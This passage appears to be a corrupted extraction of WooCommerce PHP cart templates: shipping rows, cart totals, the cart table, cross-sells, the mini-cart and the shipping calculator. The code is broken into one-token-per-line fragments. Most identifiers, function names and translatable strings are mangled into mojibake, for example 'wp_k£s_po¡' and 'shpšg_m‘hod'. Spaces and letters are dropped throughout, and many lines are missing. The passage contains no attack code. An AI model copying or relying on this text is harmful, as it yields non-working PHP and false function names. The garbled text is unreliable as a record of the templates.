['key'] );

18 <
dt
 
şass
="v¬ŸtiÚ-<?ph°echØ§n™ize_html_şassĞ$key ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$d©a
['key'] ); ?>:</dt>

19 <
dd
 
şass
="v¬ŸtiÚ-<?ph°echØ§n™ize_html_şassĞ$key ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
	`w·utİ
Ğ
$d©a
['value'] ) ); ?></dd>

20 <?
php
 
’dfÜ—ch
; ?>

21 </
dl
>

	@templates/cart/cart-shipping.php

1 <?
php


11 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

13 <
Œ
 
	gşass
="shipping">

14 <
th
><?
php


15 iàĞ
$show_·ckage_d‘as
 ) {

16 
´štf
Ğ
__
Ğ'Shpšg #%d', 'woocomm”û' ), 
$šdex
 + 1 );

18 
_e
( 'Shipping‡nd Handling', 'woocommerce' );

20 ?></
	gth
>

21 <
	gtd
>

22 <?
php
 iàĞ! 
	$em±y
Ğ
$avaabË_m‘hods
 ) ) : ?>

24 <?
php
 iàĞ1 ==ğ
	$couÁ
Ğ
$avaabË_m‘hods
 ) ) :

25 
$m‘hod
 = 
	`cu¼’t
Ğ
$avaabË_m‘hods
 );

27 
echo
 
	`wp_k£s_po¡
Ğ
	`wc_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
Ğ
$m‘hod
 ) ); ?>

28 <
šput
 
ty³
="hidd’" 
Çme
="shpšg_m‘hod[<?ph°echØ$šdex; ?>]" 
d©a
-
šdex
="<?ph°echØ$šdex; ?>" 
id
="shpšg_m‘hod_<?ph°echØ$šdex; ?>" 
v®ue
="<?ph°echØesc_©ŒĞ$m‘hod->id ); ?>" 
şass
="shipping_method" />

30 <?
php
 
	`–£if
 ( 
	`g‘_İtiÚ
( 'woocommerce_shipping_method_format' ) === 'select' ) : ?>

32 <
£Ëù
 
Çme
="shpšg_m‘hod[<?ph°echØ$šdex; ?>]" 
d©a
-
šdex
="<?ph°echØ$šdex; ?>" 
id
="shpšg_m‘hod_<?ph°echØ$šdex; ?>" 
şass
="shipping_method">

33 <?
php
 
	$fÜ—ch
 ( 
$avaabË_m‘hods
 
as
 
$m‘hod
 ) : ?>

34 <
İtiÚ
 
v®ue
="<?ph°echØesc_©ŒĞ$m‘hod->id ); ?>" <?
php
 
	`£Ëùed
Ğ
$m‘hod
->
id
, 
$cho£n_m‘hod
 ); ?>><?ph°
echo
 
	`wp_k£s_po¡
Ğ
	`wc_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
( $method ) ); ?></option>

35 <?
php
 
’dfÜ—ch
; ?>

36 </
£Ëù
>

38 <?
php
 : ?>

40 <
ul
 
id
="shipping_method">

41 <?
php
 
	$fÜ—ch
 ( 
$avaabË_m‘hods
 
as
 
$m‘hod
 ) : ?>

42 <
li
>

43 <
šput
 
ty³
="¿dio" 
Çme
="shpšg_m‘hod[<?ph°echØ$šdex; ?>]" 
d©a
-
šdex
="<?ph°echØ$šdex; ?>" 
id
="shpšg_m‘hod_<?ph°echØ$šdex; ?>_<?ph°echØ§n™ize_t™ËĞ$m‘hod->id ); ?>" 
v®ue
="<?ph°echØesc_©ŒĞ$m‘hod->id ); ?>" <?
php
 
	`checked
Ğ
$m‘hod
->id, 
$cho£n_m‘hod
 ); ?> 
şass
="shipping_method" />

44 <
Ïb–
 ="shpšg_m‘hod_<?ph°echØ$šdex; ?>_<?ph°echØ§n™ize_t™ËĞ$m‘hod->id ); ?>"><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
	`wc_ÿ¹_tÙ®s_shpšg_m‘hod_Ïb–
Ğ
$m‘hod
 ) ); ?></label>

45 </
li
>

46 <?
php
 
’dfÜ—ch
; ?>

47 </
ul
>

49 <?
php
 
’dif
; ?>

51 <?
php
 
	`–£if
 ( ! 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_¡©e
(è|| ! WC()->cu¡om”->
	$g‘_shpšg_po¡code
() ) : ?>

53 <?
php
 iàĞ
	`is_ÿ¹
(è&& 
	`g‘_İtiÚ
( 'woocommerce_enable_shipping_calc' ) === 'yes' ) : ?>

55 <
p
><?
php
 
	`_e
( 'Please usehe shipping calculatoro see‡vailable shipping methods.', 'woocommerce' ); ?></p>

57 <?
php
 
	`–£if
 ( 
	$is_ÿ¹
() ) : ?>

59 <
p
><?
php
 
	`_e
( 'Please continueohe checkout‡ndƒnter your full‡ddresso see ifhere‡re‡ny‡vailable shipping methods.', 'woocommerce' ); ?></p>

61 <?
php
 : ?>

63 <
p
><?
php
 
	`_e
( 'Please fill in your detailso see‡vailable shipping methods.', 'woocommerce' ); ?></p>

65 <?
php
 
’dif
; ?>

67 <?
php
 : ?>

69 <?
php
 iàĞ
	$is_ÿ¹
() ) : ?>

71 <?
php
 
echo
 
	`­¶y_f‹rs
( 'woocommerce_cart_no_shipping_available_html',

72 '<div cÏss="woocomm”û-šfo"><p>' . 
	`__
( 'There doesn&lsquo;t seemo be‡ny‡vailable shipping methods. Please double check your‡ddress, or contact us if you‚eed‡ny help.', 'woocommerce' ) . '</p></div>'

75 <?
php
 : ?>

77 <?
php
 
echo
 
	`­¶y_f‹rs
( 'woocommerce_no_shipping_available_html',

78 '<p>' . 
	`__
( 'There doesn&lsquo;t seemo be‡ny‡vailable shipping methods. Please double check your‡ddress, or contact us if you‚eed‡ny help.', 'woocommerce' ) . '</p>'

81 <?
php
 
’dif
; ?>

83 <?
php
 
’dif
; ?>

85 <?
php
 iàĞ
$show_·ckage_d‘as
 ) : ?>

86 <?
php


87 
	`fÜ—ch
 ( 
$·ckage
['cÚ‹Ás'] 
as
 
$™em_id
 => 
$v®ues
 ) {

88 iàĞ
$v®ues
['d©a']->
	`Ãeds_shpšg
() ) {

89 
$´oduù_Çmes
[] = 
$v®ues
['d©a']->
	`g‘_t™Ë
() . ' &times;' . $values['quantity'];

91 
	}
}

93 
	gecho
 '<°şass="woocomm”û-shpšg-cÚ‹Ás"><sm®l>' . 
__
Ğ'Shpšg', 'woocomm”û' ) . ': ' . 
im¶ode
Ğ', ', 
$´oduù_Çmes
 ) . '</small></p>';

95 <?
php
 
	g’dif
; ?>

96 </
	gtd
>

97 </
	gŒ
>

	@templates/cart/cart-totals.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 <
div
 
	gşass
="cart_totals <?php if ( WC()->customer->has_calculated_shipping() )ƒcho 'calculated_shipping'; ?>">

14 <?
php
 
do_aùiÚ
( 'woocommerce_before_cart_totals' ); ?>

16 <
	gh2
><?
php
 
_e
( 'Cart Totals', 'woocommerce' ); ?></h2>

18 <
bË
 
	gûÎ¥acšg
="0">

20 <
Œ
 
şass
="cart-subtotal">

21 <
th
><?
php
 
_e
Ğ'C¬ˆSubtÙ®', 'woocomm”û' ); ?></
	gth
>

22 <
	gtd
><?
php
 
wc_ÿ¹_tÙ®s_subtÙ®_html
(); ?></td>

23 </
	gŒ
>

25 <?
php
 
fÜ—ch
 ( 
WC
()->
ÿ¹
->
g‘_coupÚs
Ğ'ÿ¹' ) 
as
 
$code
 => 
$coupÚ
 ) : ?>

26 <
Œ
 
şass
="cart-discount coupon-<?phpƒchoƒsc_attr( $code ); ?>">

27 <
th
><?
php
 
wc_ÿ¹_tÙ®s_coupÚ_Ïb–
Ğ
$coupÚ
 ); ?></
	gth
>

28 <
	gtd
><?
php
 
wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ); ?></td>

29 </
	gŒ
>

30 <?
php
 
	g’dfÜ—ch
; ?>

32 <?
php
 iàĞ
WC
()->
	gÿ¹
->
Ãeds_shpšg
(è&& WC()->ÿ¹->
	$show_shpšg
() ) : ?>

34 <?
php
 
	`do_aùiÚ
( 'woocommerce_cart_totals_before_shipping' ); ?>

36 <?
php
 
	`wc_ÿ¹_tÙ®s_shpšg_html
(); ?>

38 <?
php
 
	`do_aùiÚ
( 'woocommerce_cart_totals_after_shipping' ); ?>

40 <?
php
 
’dif
; ?>

42 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	$g‘_ães
(è
as
 
$ãe
 ) : ?>

43 <
Œ
 
şass
="fee">

44 <
th
><?
php
 
echo
 
	`esc_html
Ğ
$ãe
->
Çme
 ); ?></th>

45 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_ãe_html
Ğ
$ãe
 ); ?></td>

46 </
Œ
>

47 <?
php
 
’dfÜ—ch
; ?>

49 <?
php
 iàĞ
	`WC
()->
ÿ¹
->
x_di¥Ïy_ÿ¹
 == 'excl' ) : ?>

50 <?
php
 iàĞ
	`g‘_İtiÚ
( 'woocommerce_tax_total_display' ) == 'itemized' ) : ?>

51 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	$g‘_x_tÙ®s
(è
as
 
$code
 => 
$x
 ) : ?>

52 <
Œ
 
şass
="tax-rateax-rate-<?phpƒcho sanitize_title( $code ); ?>">

53 <
th
><?
php
 
echo
 
	`esc_html
Ğ
$x
->
Ïb–
 ); ?></th>

54 <
td
><?
php
 
echo
 
	`wp_k£s_po¡
Ğ
$x
->
fÜm©‹d_amouÁ
 ); ?></td>

55 </
Œ
>

56 <?
php
 
’dfÜ—ch
; ?>

57 <?
php
 : ?>

58 <
Œ
 
şass
="tax-total">

59 <
th
><?
php
 
echo
 
	`esc_html
Ğ
	`WC
()->
couÁr›s
->
	`x_Ü_v©
() ); ?></th>

60 <
td
><?
php
 
echo
 
	`wc_ÿ¹_tÙ®s_xes_tÙ®_html
(); ?></td>

61 </
Œ
>

62 <?
php
 
’dif
; ?>

63 <?
php
 
’dif
; ?>

65 <?
php
 
	`fÜ—ch
 ( 
	`WC
()->
ÿ¹
->
	`g‘_coupÚs
Ğ'Üd”' ) 
as
 
$code
 => 
$coupÚ
 ) : ?>

66 <
Œ
 
şass
="order-discount coupon-<?phpƒchoƒsc_attr( $code ); ?>">

67 <
th
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_Ïb–
Ğ
$coupÚ
 ); ?></th>

68 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_coupÚ_html
Ğ
$coupÚ
 ); ?></td>

69 </
Œ
>

70 <?
php
 
’dfÜ—ch
; ?>

72 <?
php
 
	`do_aùiÚ
( 'woocommerce_cart_totals_before_order_total' ); ?>

74 <
Œ
 
şass
="order-total">

75 <
th
><?
php
 
	`_e
( 'Order Total', 'woocommerce' ); ?></th>

76 <
td
><?
php
 
	`wc_ÿ¹_tÙ®s_Üd”_tÙ®_html
(); ?></td>

77 </
Œ
>

79 <?
php
 
	`do_aùiÚ
( 'woocommerce_cart_totals_after_order_total' ); ?>

81 </
bË
>

83 <?
php
 iàĞ
	`WC
()->
ÿ¹
->
	$g‘_ÿ¹_x
() ) : ?>

84 <
p
><
sm®l
><?
php


86 
$e¡im©ed_‹xt
 = 
	`WC
()->
cu¡om”
->
	`is_cu¡om”_outside_ba£
(è&& ! WC()->cu¡om”->
	`has_ÿlcuÏ‹d_shpšg
()

87 ? 
	`¥rštf
Ğ' ' . 
	`__
Ğ' (xe e¡im©ed fÜ %s)', 'woocomm”û' ), 
	`WC
()->
couÁr›s
->
	`e¡im©ed_fÜ_´efix
(è. __ĞWC()->couÁr›s->couÁr›s[ WC()->couÁr›s->
	`g‘_ba£_couÁry
() ], 'woocommerce' ) )

90 
	`´štf
Ğ
	`__
Ğ'NÙe: Shpšg‡ndaxe ¬e¡im©ed% ªd wÈbupd©ed duršg checkouˆba£d oÀyou¸blšg‡nd shpšg infÜm©iÚ.', 'woocomm”û' ), 
$e¡im©ed_‹xt
 );

92 ?></
sm®l
></
p
>

93 <?
php
 
’dif
; ?>

95 <?
php
 
	`do_aùiÚ
( 'woocommerce_after_cart_totals' ); ?>

97 </
div
>

	@templates/cart/cart.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 
wc_´št_nÙiûs
();

16 
do_aùiÚ
( 'woocommerce_before_cart' ); ?>

18 <
fÜm
 
	gaùiÚ
="<?ph°echØesc_u¾ĞWC()->ÿ¹->g‘_ÿ¹_u¾(è); ?>" 
m‘hod
="post">

20 <?
php
 
do_aùiÚ
( 'woocommerce_before_cart_table' ); ?>

22 <
bË
 
	gşass
="shİ_bË c¬t" 
ûÎ¥acšg
="0">

23 <
th—d
>

24 <
Œ
>

25 <
th
 
şass
="´oduù-»move">&
nb¥
;</
	gth
>

26 <
th
 
	gşass
="´oduù-thumbÇ">&
nb¥
;</
	gth
>

27 <
th
 
	gşass
="´oduù-Çme"><?
php
 
_e
Ğ'Produù', 'woocomm”û' ); ?></
	gth
>

28 <
th
 
	gşass
="´oduù-´iû"><?
php
 
_e
Ğ'Priû', 'woocomm”û' ); ?></
	gth
>

29 <
th
 
	gşass
="´oduù-quªt™y"><?
php
 
_e
Ğ'Quªt™y', 'woocomm”û' ); ?></
	gth
>

30 <
th
 
	gşass
="´oduù-subtÙ®"><?
php
 
_e
Ğ'TÙ®', 'woocomm”û' ); ?></
	gth
>

31 </
	gŒ
>

32 </
	gth—d
>

33 <
	gtbody
>

34 <?
php
 
do_aùiÚ
( 'woocommerce_before_cart_contents' ); ?>

36 <?
php


37 
fÜ—ch
 ( 
WC
()->
ÿ¹
->
	$g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

38 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´oduù', 
$ÿ¹_™em
['d©a'], $ÿ¹_™em, 
$ÿ¹_™em_key
 );

39 
$´oduù_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´oduù_id', 
$ÿ¹_™em
['´oduù_id'], $ÿ¹_™em, 
$ÿ¹_™em_key
 );

41 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& 
$ÿ¹_™em
['quªt™y'] > 0 && 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_visibË', 
Œue
, $ÿ¹_™em, 
$ÿ¹_™em_key
 ) ) {

43 <
Œ
 
şass
="<?phpƒchoƒsc_attr(‡pply_filters( 'woocommerce_cart_item_class', 'cart_item', $cart_item, $cart_item_key ) ); ?>">

45 <
td
 
şass
="product-remove">

46 <?
php


47 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_»move_lšk', 
	`¥rštf
Ğ'<¨h»f="%s" cÏss="»move"™Ë="%s">&times;</a>', 
	`esc_u¾
Ğ
	`WC
()->
ÿ¹
->
	`g‘_»move_u¾
Ğ
$ÿ¹_™em_key
 ) ), 
	`__
( 'Removehis item', 'woocommerce' ) ), $cart_item_key );

49 </
td
>

51 <
td
 
şass
="product-thumbnail">

52 <?
php


53 
$thumbÇ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_thumbÇ', 
$_´oduù
->
	`g‘_image
(), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

55 iàĞ! 
$_´oduù
->
	`is_visibË
() )

56 
echo
 
$thumbÇ
;

58 
	`´štf
Ğ'<¨h»f="%s">%s</a>', 
$_´oduù
->
	`g‘_³rm®šk
(), 
$thumbÇ
 );

60 </
td
>

62 <
td
 
şass
="product-name">

63 <?
php


64 iàĞ! 
$_´oduù
->
	`is_visibË
() )

65 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_Çme', 
$_´oduù
->
	`g‘_t™Ë
(), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

67 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_Çme', 
	`¥rštf
Ğ'<¨h»f="%s">%s</a>', 
$_´oduù
->
	`g‘_³rm®šk
(), $_´oduù->
	`g‘_t™Ë
(è), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

70 
echo
 
	`WC
()->
ÿ¹
->
	`g‘_™em_d©a
Ğ
$ÿ¹_™em
 );

73 iàĞ
$_´oduù
->
	`backÜd”s_»quœe_nÙifiÿtiÚ
(è&& $_´oduù->
	`is_Ú_backÜd”
Ğ
$ÿ¹_™em
['quantity'] ) )

74 
echo
 '<°şass="backÜd”_nÙifiÿtiÚ">' . 
	`__
( 'Available on backorder', 'woocommerce' ) . '</p>';

76 </
td
>

78 <
td
 
şass
="product-price">

79 <?
php


80 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´iû', 
	`WC
()->
ÿ¹
->
	`g‘_´oduù_´iû
Ğ
$_´oduù
 ), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

82 </
td
>

84 <
td
 
şass
="product-quantity">

85 <?
php


86 iàĞ
$_´oduù
->
	`is_sŞd_šdividu®ly
() ) {

87 
$´oduù_quªt™y
 = 
	`¥rštf
Ğ'1 <špuˆty³="hidd’"‚ame="ÿ¹[%s][qty]" v®ue="1" />', 
$ÿ¹_™em_key
 );

89 
$´oduù_quªt™y
 = 
	`woocomm”û_quªt™y_šput
Ğ
	`¬¿y
(

91 'šput_v®ue' => 
$ÿ¹_™em
['quantity'],

92 'max_v®ue' => 
$_´oduù
->
	`backÜd”s_®lowed
(è? '' : $_´oduù->
	`g‘_¡ock_quªt™y
(),

93 ), 
$_´oduù
, 
çl£
 );

96 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_quªt™y', 
$´oduù_quªt™y
, 
$ÿ¹_™em_key
 );

98 </
td
>

100 <
td
 
şass
="product-subtotal">

101 <?
php


102 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_subtÙ®', 
	`WC
()->
ÿ¹
->
	`g‘_´oduù_subtÙ®
Ğ
$_´oduù
, 
$ÿ¹_™em
['quªt™y'] ), $ÿ¹_™em, 
$ÿ¹_™em_key
 );

104 </
td
>

105 </
Œ
>

106 <?
php


108 
	}
}

110 
do_aùiÚ
( 'woocommerce_cart_contents' );

112 <
	gŒ
>

113 <
td
 
	gcŞ¥ª
="6" 
şass
="actions">

115 <?
php
 iàĞ
WC
()->
ÿ¹
->
	$coupÚs_’abËd
() ) { ?>

116 <
div
 
şass
="coupon">

118 <
Ïb–
 ="coupÚ_code"><?
php
 
	`_e
Ğ'CoupÚ', 'woocomm”û' ); ?>:</Ïb–> <
šput
 
ty³
="‹xt" 
Çme
="coupÚ_code" 
şass
="šput-‹xt" 
id
="coupÚ_code" 
v®ue
="" 
¶aûhŞd”
="<?php _e( 'Coupon code', 'woocommerce' ); ?>" /> <inputype="submit" class="button"‚ame="apply_coupon" value="<?php _e( 'Apply Coupon', 'woocommerce' ); ?>" />

120 <?
php
 
	`do_aùiÚ
('woocommerce_cart_coupon'); ?>

122 </
div
>

123 <?
php
 
	}
} ?>

125 <
šput
 
	gty³
="subm™" 
şass
="bu‰Ú" 
Çme
="upd©e_ÿ¹" 
v®ue
="<?ph°_eĞ'Upd©C¬t', 'woocomm”û' ); ?>" /> <špuˆ
ty³
="submit" class="checkout-button button‡lt wc-forward"‚ame="proceed" value="<?php _e( 'Proceedo Checkout', 'woocommerce' ); ?>" />

127 <?
php
 
do_aùiÚ
( 'woocommerce_proceed_to_checkout' ); ?>

129 <?
php
 
wp_nÚû_f›ld
( 'woocommerce-cart' ); ?>

130 </
	gtd
>

131 </
	gŒ
>

133 <?
php
 
do_aùiÚ
( 'woocommerce_after_cart_contents' ); ?>

134 </
	gtbody
>

135 </
	gbË
>

137 <?
php
 
do_aùiÚ
( 'woocommerce_after_cart_table' ); ?>

139 </
	gfÜm
>

141 <
div
 
	gşass
="cart-collaterals">

143 <?
php
 
do_aùiÚ
( 'woocommerce_cart_collaterals' ); ?>

145 <?
php
 
woocomm”û_ÿ¹_tÙ®s
(); ?>

147 <?
php
 
woocomm”û_shpšg_ÿlcuÏtÜ
(); ?>

149 </
	gdiv
>

151 <?
php
 
do_aùiÚ
( 'woocommerce_after_cart' ); ?>

	@templates/cart/cross-sells.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$´oduù
, 
	g$woocomm”û
, 
	g$woocomm”û_loİ
;

14 
	g$üoss£Îs
 = 
WC
()->
ÿ¹
->
g‘_üoss_£Îs
();

16 iàĞĞ
	g$üoss£Îs
 ) == 0 ) ;

18 
	g$m‘a_qu”y
 = 
WC
()->
qu”y
->
g‘_m‘a_qu”y
();

20 
	g$¬gs
 = 
¬¿y
(

24 'po¡s_³r_·ge' => 
­¶y_f‹rs
Ğ'woocomm”û_üoss_£Îs_tÙ®', 
$po¡s_³r_·ge
 ),

25 'Üd”by' => 
$Üd”by
,

26 'po¡__š' => 
$üoss£Îs
,

27 'm‘a_qu”y' => 
$m‘a_qu”y


30 
	g$´oduùs
 = 
Ãw
 
WP_Qu”y
Ğ
$¬gs
 );

32 
	g$woocomm”û_loİ
['cŞumns'] = 
­¶y_f‹rs
Ğ'woocomm”û_üoss_£Îs_cŞumns', 
$cŞumns
 );

34 iàĞ
	g$´oduùs
->
	$have_po¡s
() ) : ?>

36 <
div
 
şass
="cross-sells">

38 <
h2
><?
php
 
	`_e
( 'You may be interested in&hellip;', 'woocommerce' ) ?></h2>

40 <?
php
 
	`woocomm”û_´oduù_loİ_¡¬t
(); ?>

42 <?
php
  
$´oduùs
->
	$have_po¡s
(èè: 
$´oduùs
->
	`the_po¡
(); ?>

44 <?
php
 
	`wc_g‘_‹m¶©e_·¹
( 'content', 'product' ); ?>

46 <?
php
 
’dwhe
;

48 <?
php
 
	`woocomm”û_´oduù_loİ_’d
(); ?>

50 </
div
>

52 <?
php
 
’dif
;

54 
	`wp_»£t_qu”y
();

	@templates/cart/mini-cart.php

1 <?
php


12 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

14 
glob®
 
	g$woocomm”û
;

17 <?
php
 
do_aùiÚ
( 'woocommerce_before_mini_cart' ); ?>

19 <
ul
 
	gşass
="cart_list…roduct_list_widget <?phpƒcho $args['list_class']; ?>">

21 <?
php
 iàĞĞ
WC
()->
ÿ¹
->
g‘_ÿ¹
() ) > 0 ) : ?>

23 <?
php


24 
fÜ—ch
 ( 
WC
()->
ÿ¹
->
	$g‘_ÿ¹
(è
as
 
$ÿ¹_™em_key
 => 
$ÿ¹_™em
 ) {

25 
$_´oduù
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´oduù', 
$ÿ¹_™em
['d©a'], $ÿ¹_™em, 
$ÿ¹_™em_key
 );

26 
$´oduù_id
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´oduù_id', 
$ÿ¹_™em
['´oduù_id'], $ÿ¹_™em, 
$ÿ¹_™em_key
 );

28 iàĞ
$_´oduù
 && $_´oduù->
	`exi¡s
(è&& 
$ÿ¹_™em
['quªt™y'] > 0 && 
	`­¶y_f‹rs
Ğ'woocomm”û_widg‘_ÿ¹_™em_visibË', 
Œue
, $ÿ¹_™em, 
$ÿ¹_™em_key
 ) ) {

30 
$´oduù_Çme
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_Çme', 
$_´oduù
->
	`g‘_t™Ë
(), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

31 
$thumbÇ
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_thumbÇ', 
$_´oduù
->
	`g‘_image
(), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

32 
$´oduù_´iû
 = 
	`­¶y_f‹rs
Ğ'woocomm”û_ÿ¹_™em_´iû', 
	`WC
()->
ÿ¹
->
	`g‘_´oduù_´iû
Ğ
$_´oduù
 ), 
$ÿ¹_™em
, 
$ÿ¹_™em_key
 );

35 <
li
>

36 <
a
 
h»f
="<?phpƒcho get_permalink( $product_id ); ?>">

37 <?
php
 
echo
 
	`¡r_»¶aû
Ğ
	`¬¿y
Ğ'h‰p:', 'h‰ps:' ), '', 
$thumbÇ
 ) . 
$´oduù_Çme
; ?>

38 </
a
>

40 <?
php
 
echo
 
	`WC
()->
ÿ¹
->
	`g‘_™em_d©a
Ğ
$ÿ¹_™em
 ); ?>

42 <?
php
 
echo
 
	`­¶y_f‹rs
Ğ'woocomm”û_widg‘_ÿ¹_™em_quªt™y', '<¥ª cÏss="quªt™y">' . 
	`¥rštf
Ğ'% &times; %s', 
$ÿ¹_™em
['quªt™y'], 
$´oduù_´iû
 ) . '</¥ª>', $ÿ¹_™em, 
$ÿ¹_™em_key
 ); ?>

43 </
li
>

44 <?
php


46 
	}
}

49 <?
php
 : ?>

51 <
li
 
şass
="em±y"><?
php
 
_e
Ğ'NØ´oduù šhÿ¹.', 'woocomm”û' ); ?></
	gli
>

53 <?
php
 
	g’dif
; ?>

55 </
	gul
><!-- 
’d
 
´oduù
 
	gli¡
 -->

57 <?
php
 iàĞĞ
WC
()->
	gÿ¹
->
g‘_ÿ¹
() ) > 0 ) : ?>

59 <
p
 
şass
="tÙ®"><
¡rÚg
><?
php
 
_e
Ğ'SubtÙ®', 'woocomm”û' ); ?>:</¡rÚg> <?ph°
echo
 
WC
()->
ÿ¹
->
g‘_ÿ¹_subtÙ®
(); ?></
	gp
>

61 <?
php
 
do_aùiÚ
( 'woocommerce_widget_shopping_cart_before_buttons' ); ?>

63 <
p
 
	gşass
="buttons">

64 <
a
 
h»f
="<?ph°echØWC()->ÿ¹->g‘_ÿ¹_u¾(); ?>" 
şass
="bu‰Ú wc-fÜw¬d"><?
php
 
_e
Ğ'V›w C¬t', 'woocomm”û' ); ?></
	ga
>

65 <
a
 
	gh»f
="<?ph°echØWC()->ÿ¹->g‘_checkout_u¾(); ?>" 
şass
="bu‰Ú checkouˆwc-fÜw¬d"><?
php
 
_e
Ğ'Checkout', 'woocomm”û' ); ?></
	ga
>

66 </
	gp
>

68 <?
php
 
	g’dif
; ?>

70 <?
php
 
do_aùiÚ
( 'woocommerce_after_mini_cart' ); ?>

	@templates/cart/shipping-calculator.php

1 <?
php


10 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

12 
glob®
 
	g$woocomm”û
;

14 iàĞ
g‘_İtiÚ
Ğ'woocomm”û_’abË_shpšg_ÿlc' ) ==ğ'no' || ! 
WC
()->
ÿ¹
->
	$Ãeds_shpšg
() )

18 <?
php
 
	`do_aùiÚ
( 'woocommerce_before_shipping_calculator' ); ?>

20 <
fÜm
 
şass
="shpšg_ÿlcuÏtÜ" 
aùiÚ
="<?ph°echØesc_u¾ĞWC()->ÿ¹->g‘_ÿ¹_u¾(è); ?>" 
m‘hod
="post">

22 <
h2
><
a
 
h»f
="#" 
şass
="shpšg-ÿlcuÏtÜ-bu‰Ú"><?
php
 
	`_e
( 'Calculate Shipping', 'woocommerce' ); ?></a></h2>

24 <
£ùiÚ
 
şass
="shipping-calculator-form">

26 <
p
 
şass
="form-row form-row-wide">

27 <
£Ëù
 
Çme
="ÿlc_shpšg_couÁry" 
id
="ÿlc_shpšg_couÁry" 
şass
="couÁry_to_¡©e" 
»l
="calc_shipping_state">

28 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Select‡ country&hellip;', 'woocommerce' ); ?></option>

29 <?
php


30 
	`fÜ—ch
Ğ
	`WC
()->
couÁr›s
->
	$g‘_shpšg_couÁr›s
(è
as
 
$key
 => 
$v®ue
 )

31 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$key
 ) . '"' . 
	`£Ëùed
Ğ
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
(),ƒsc_©ŒĞ$key ), 
çl£
 ) . '>' . 
	`esc_html
Ğ
$v®ue
 ) . '</option>';

33 </
£Ëù
>

34 </
p
>

36 <
p
 
şass
="form-row form-row-wide">

37 <?
php


38 
$cu¼’t_cc
 = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_couÁry
();

39 
$cu¼’t_r
 = 
	`WC
()->
cu¡om”
->
	`g‘_shpšg_¡©e
();

40 
$¡©es
 = 
	`WC
()->
couÁr›s
->
	`g‘_¡©es
Ğ
$cu¼’t_cc
 );

43 iàĞ
	`is_¬¿y
Ğ
$¡©es
 ) && 
	$em±y
Ğ
$¡©es
 ) ) {

45 ?><
šput
 
ty³
="hidd’" 
Çme
="ÿlc_shpšg_¡©e" 
id
="ÿlc_shpšg_¡©e" 
¶aûhŞd”
="<?ph°_eĞ'S‹ / couÁy', 'woocomm”û' ); ?>" /><?
php


48 
	}
} 
–£if
 ( 
	$is_¬¿y
Ğ
$¡©es
 ) ) {

50 ?><
¥ª
>

51 <
£Ëù
 
Çme
="ÿlc_shpšg_¡©e" 
id
="ÿlc_shpšg_¡©e" 
¶aûhŞd”
="<?php _e( 'State / county', 'woocommerce' ); ?>">

52 <
İtiÚ
 
v®ue
=""><?
php
 
	`_e
( 'Select‡ state&hellip;', 'woocommerce' ); ?></option>

53 <?
php


54 
	`fÜ—ch
 ( 
$¡©es
 
as
 
$ckey
 => 
$cv®ue
 )

55 
echo
 '<İtiÚ v®ue="' . 
	`esc_©Œ
Ğ
$ckey
 ) . '" ' . 
	`£Ëùed
Ğ
$cu¼’t_r
, $ckey, 
çl£
 ) . '>' . 
	`__
Ğ
	`esc_html
Ğ
$cv®ue
 ), 'woocommerce' ) .'</option>';

57 </
£Ëù
>

58 </
¥ª
><?
php


61 
	}
} {

63 ?><
šput
 
	gty³
="‹xt" 
şass
="šput-‹xt" 
v®ue
="<?ph°echØesc_©ŒĞ$cu¼’t_¸); ?>" 
¶aûhŞd”
="<?ph°_eĞ'S‹ / couÁy', 'woocomm”û' ); ?>" 
Çme
="ÿlc_shpšg_¡©e" 
id
